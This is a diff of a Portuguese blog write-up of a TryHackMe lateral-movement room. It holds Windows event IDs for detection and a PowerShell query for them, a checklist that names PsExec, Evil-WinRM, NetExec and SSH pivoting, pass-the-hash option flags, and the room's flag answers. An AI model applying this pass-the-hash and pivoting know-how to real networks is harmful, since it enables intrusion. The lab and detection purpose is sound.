+| `4698` | Security | Tarefa agendada criada |
+| `4688` | Security | Criação de processo (detalhes dependem da auditoria) |
+| Sysmon `1` | Sysmon/Operational | Processo criado e processo pai |
+| Sysmon `10` | Sysmon/Operational | Acesso a outros processos, relevante em investigação de LSASS |
+
+**Comando direto no PowerShell para o Event ID 7045:**
 
 ~~~powershell
 Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} |
   Select-Object TimeCreated, Id, Message
 ~~~
 
-`TimeCreated` aparece primeiro. Um serviço novo pode ser legítimo; correlacione conta, origem, nome do serviço e processo.
+`TimeCreated` fica primeiro, como referência temporal para correlacionar o serviço com autenticações e processos. **Serviço novo não é automaticamente ataque**: verificar origem, conta, comando, nome e contexto administrativo.
 
-## 10. Checklist geral
-
-| Etapa | Conferir |
-|---|---|
-| Recon | IPs alcançáveis, portas abertas e portas filtradas |
-| Identidade | Quem sou e em **qual host** estou executando? |
-| Privilégios | Login remoto, administrador local ou Domain Admin? |
-| Acesso | SMB, WinRM, SSH ou RDP; requisitos de cada protocolo |
-| Credenciais | Qual conta, qual máquina e escopo **local x domínio** |
-| Movimento | Há autenticação válida **e** caminho de rede? |
-| Pivoting | Qual host intermediário enxerga o destino? |
-| Comprovação | `hostname`, `whoami`, saída efetiva e flag |
-| Defesa | Serviços, logons remotos, tarefas, contas privilegiadas |
-
-**Aprendizado:** obter SYSTEM em uma workstation não equivale a comprometer o domínio. Cada salto depende de **permissão no alvo e conectividade**. E um timeout por filtragem não prova que a credencial esteja incorreta.
+[Voltar ao índice](#topo)
 
 ---
 
-## 11. Outros posts e referências
+<a id="checklist"></a>
 
-**Meus posts relacionados:**
+## 12. Checklist de movimentação lateral e comandos
+
+| Etapa | O que perguntar | Comandos / ferramentas |
+|---|---|---|
+| **1. Recon** | Quais hosts/portas posso alcançar? | `fping`, `nmap` |
+| **2. Identidade** | Quem sou e em qual máquina? | `whoami`, `hostname`, `id` |
+| **3. Direitos** | Tenho login, admin local ou Domain Admin? | `nxc`, `whoami /priv` |
+| **4. Acesso remoto** | O alvo aceita SMB, WinRM, SSH ou RDP? | PsExec, Evil-WinRM, SSH, RDP |
+| **5. Credenciais** | Qual hash pertence a qual conta e escopo? | Análise de artefatos autorizados |
+| **6. Validação** | A credencial foi aceita? Tenho privilégios? | Saídas `[+]`, `(Pwn3d!)` e `whoami` |
+| **7. Pivô** | A origem enxerga o destino? Um intermediário enxerga? | SSH `-L`/`-D`, ProxyChains |
+| **8. Prova** | Qual host realmente executou o comando? | `hostname`, `whoami`, artefato solicitado |
+| **9. Defesa** | Que evento ficou registrado? | `Get-WinEvent`, Sysmon |
+
+### Operadores mais úteis desta room
+
+| Opção / operador | Explicação |
+|---|---|
+| `-u` / `-p` | Usuário / senha |
+| `-H` (NetExec, Evil-WinRM) | NT hash |
+| `--local-auth` | Autenticar no banco local de contas |
+| `-hashes LM:NT` | Hashes no formato esperado pelo Impacket |
+| `-d` | Domínio no NetExec |
+| `-v` | Debug do SSH |
+| `-L` / `-D` | Encaminhamento local / proxy dinâmico SSH |
+| `-f` / `-N` | Background / sem execução remota |
+| `-sT` / `-Pn` | TCP Connect / sem descoberta por ping |
+| `-s` (curl) | Silencia mensagens de progresso |
+| `|` | Encaminha saída para outro comando |
+| `>` / `>>` | Sobrescreve / acrescenta em arquivo |
+| `2>/dev/null` | Descarta a saída de erros |
+
+**O que aprendi:** não adianta ter a credencial correta se a porta não é alcançável; e não adianta alcançar a porta sem autorização no destino. A ordem que funcionou foi **reconhecer → validar permissões → acessar → encontrar nova credencial → conferir o caminho de rede → avançar → confirmar identidade e resultado**.
+
+**Flags confirmadas nas anotações da room:** `THM{ps3x3c_syst3m_sh3ll}`, `THM{w1nrm_r3m0t3_sh3ll}`, `THM{p4ss_th3_h4sh_ftw}` e `THM{d0m41n_c0mpr0m1s3d_v1a_p1v0t}`.
+
+[Voltar ao índice](#topo)
+
+---
+
+<a id="links"></a>
+
+## 13. Referências e posts relacionados
+
+**Outros guias do meu site:**
 
 - [Active Directory — enumeração, password spraying e AS-REP Roasting](/notes/ad-authenticated-enumeration/)
-- [Windows Jump — Guest ao SYSTEM](/notes/windows-jump/)
-- [Windows Privilege Escalation — tokens e Pass-the-Hash](/notes/windows-privilege-escalation/)
+- [Windows Jump — do Guest ao SYSTEM](/notes/windows-jump/)
+- [Windows Privilege Escalation — tokens, privilégios e Pass-the-Hash](/notes/windows-privilege-escalation/)
 
-**Referências:**
+**Documentação externa:**
 
 - [TryHackMe](https://tryhackme.com/)
-- [TryHackMe — Detecting AD Lateral Movement (room de detecção complementar)](https://tryhackme.com/room/detectingadlateralmovement)
-- [Impacket — PsExec](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
+- [Impacket — `psexec.py`](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
+- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
 - [NetExec](https://www.netexec.wiki/)
-- [MITRE ATT&CK — SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002/)
+- [ProxyChains-NG](https://github.com/rofl0r/proxychains-ng)
+- [OpenSSH — `ssh(1)`](https://man.openbsd.org/ssh)
+- [MITRE ATT&CK — Remote Services](https://attack.mitre.org/techniques/T1021/)
 - [MITRE ATT&CK — Pass-the-Hash](https://attack.mitre.org/techniques/T1550/002/)
-- [Microsoft Learn — Windows LAPS](https://learn.microsoft.com/pt-br/windows-server/identity/laps/laps-overview)
+- [Microsoft Learn — Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
+
+[Voltar ao topo](#topo)
